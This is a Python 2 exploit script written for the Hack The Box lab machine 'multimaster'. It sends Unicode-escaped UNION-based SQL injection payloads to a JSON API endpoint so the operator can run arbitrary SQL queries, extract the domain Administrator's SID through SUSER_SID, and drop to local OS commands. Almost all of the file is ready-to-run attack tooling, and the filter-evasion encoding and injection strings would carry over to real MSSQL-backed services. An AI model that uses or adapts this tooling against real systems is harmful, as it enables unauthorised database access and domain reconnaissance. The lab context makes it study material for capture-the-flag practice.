#! /usr/bin/env python2
# coded by script1337
import requests
import json
import os
from time import sleep
import re
target_url = "http://multimaster.htb/api/getColleagues"



def udpayload(payload):
    encodedpayload = ""
    for i in payload:
    	encodedpayload += r"\u00"+str(i.encode("hex"))
    print ("Sending payload > " + str(encodedpayload))
    return encodedpayload

def injectpayload(command,sidextract):
	if sidextract == True:
		data = "{\"name\": \""+udpayload("-5468' UNION ALL SELECT 2887,2887,2887,2887,(SELECT CONVERT(varchar(max), SUSER_SID('"+command+"\\Administrator'),2))--")+"\"}"
	else:
		data = "{\"name\": \""+udpayload("-5468' UNION ALL SELECT 2887,2887,2887,2887,"+command+"--")+"\"}"
	return data

def main():
	while True:
		injection = raw_input("script1337@"+os.uname()[1]+"#")
		if injection == "getadminsid":
			domain = raw_input("Enter your target domain > ")
			s = requests.post(target_url,data = injectpayload(domain, True), headers= {"Content-Type": "application/json;charset=utf-8"})
			response = json.loads(s.content)
			try:
				src = response[0].get("src")
				print ("Administrator SID > "+src)
			except:
				print response
			main()
		if injection == "#":
			os.system(raw_input("script1337@"+os.uname()[1]+"$"))
			main()
		s = requests.post(target_url,data = injectpayload(injection,False), headers= {"Content-Type": "application/json;charset=utf-8"})
		response = json.loads(s.content)
		try:
			src = response[0].get("src")
			print ("SRC > "+src)
		except:
			print response

print (r"""

Commands {
	# getadminsid
	# run sql commands
	# # use to run os command
	# This script for hackthebox multimaster
}
	""")

main()
